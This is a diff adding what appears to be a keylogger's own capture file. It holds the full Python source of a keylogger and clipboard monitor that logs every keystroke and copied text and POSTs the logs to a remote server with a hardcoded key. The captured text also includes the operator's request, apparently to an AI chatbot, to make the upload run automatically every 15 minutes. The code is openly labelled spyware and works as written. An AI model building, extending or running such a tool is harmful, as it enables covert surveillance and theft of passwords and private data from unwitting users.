@@ -1,0 +1,120 @@
+
+[📋 CLIPBOARD] from pynput import keyboard
+import pyperclip
+from datetime import datetime
+import requests
+import threading
+import time
+import atexit
+import signal
+import sys
+from pathlib import Path
+
+# ========== CONFIG ==========
+API_KEY = "secret123"
+SERVER_URL = "http://10.2.10.254:5000/upload"  # Replace with your server IP
+log_buffer = ""
+log_dir = Path("server_logs")
+log_file = None
+last_log_time = time.time()
+
+# ========== LOGGING ==========
+def write_log(data):
+    global log_buffer, last_log_time, log_file
+
+    if log_file is None:
+        log_dir.mkdir(exist_ok=True)
+        log_file = log_dir / f"log_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
+
+    current_time = time.time()
+    # Add smart line break if 30 seconds idle
+    if current_time - last_log_time > 30:
+        log_buffer += "\n"
+    last_log_time = current_time
+
+    if data:
+        log_buffer += str(data)
+        with open(log_file, "a", encoding="utf-8") as f:
+            f.write(str(data))
+
+def send_log_to_server():
+    global log_buffer
+    try:
+        if log_buffer.strip():
+            print("\n[🚀 Sending log to server...]")
+            response = requests.post(
+                SERVER_URL,
+                json={"api_key": API_KEY, "log": log_buffer}
+            )
+            print(f"[✔️ LOG SENT] Status Code: {response.status_code}")
+            log_buffer = ""  # Clear after sending
+    except Exception as e:
+        print(f"[❌ ERROR SENDING LOG]: {e}")
+
+# ========== CLIPBOARD ==========
+def monitor_clipboard():
+    last_text = ""
+    while True:
+        try:
+            text = pyperclip.paste()
+            if text and text != last_text:
+                last_text = text
+                write_log(f"\n[📋 CLIPBOARD] {text}\n")
+        except:
+            pass
+        time.sleep(2)
+
+# ========== KEY LOGGER ==========
+def on_press(key):
+    try:
+        if hasattr(key, 'char') and key.char is not None:
+            write_log(key.char)
+        else:
+            raise AttributeError
+    except AttributeError:
+        special_keys = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "\n[ENTER]\n",
+            keyboard.Key.tab: "[TAB]",
+            keyboard.Key.backspace: "[BACKSPACE]",
+            keyboard.Key.shift: "[SHIFT]",
+            keyboard.Key.ctrl_l: "[CTRL]",
+            keyboard.Key.cmd: "[WINDOWS]",
+            keyboard.Key.esc: "[ESC]",
+            keyboard.Key.caps_lock: "[CAPSLOCK]"
+        }
+        write_log(special_keys.get(key, f"[{key}]"))
+
+# ========== EXIT HANDLER ==========
+def handle_exit_signal(sig, frame):
+    print("\n[🛑 Stopping Keylogger...]")
+    send_log_to_server()
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, handle_exit_signal)
+signal.signal(signal.SIGTERM, handle_exit_signal)
+atexit.register(send_log_to_server)
+
+# ========== MAIN ==========
+if __name__ == "__main__":
+    print("[✅ Keylogger started. Press Ctrl+C to stop]")
+
+    # Start clipboard monitoring in background
+    threading.Thread(target=monitor_clipboard, daemon=True).start()
+
+    # Start key listener
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        handle_exit_signal(None, None)
+
+[SHIFT]Also[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]yes [SHIFT]I need you to send the a[BACKSPACE]logs automativ[BACKSPACE]cak[BACKSPACE]lly after 15 min and the storing of logs should br in top to bottom like if a log id[BACKSPACE]s saves[BACKSPACE]d at 3-13 [BACKSPACE][BACKSPACE]5 [SHIFT]PM and another log is store [BACKSPACE]d at 3-30 [SHIFT]PM then the 3-30 log should come af[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]come below the 3-14[BACKSPACE]5 log but it is coming above the 3-15 log
+[ENTER]
+[CTRL][CTRL][BACKSPACE]
+[📋 CLIPBOARD] yes I need you to send the logs automatically after 15 min and the storing of logs should br in top to bottom like if a log is saved at 3-15 PM and another log is stored at 3-30 PM then the 3-30 log should come below the 3-15 log but it is coming above the 3-15 log
+
+[CTRL][CTRL]
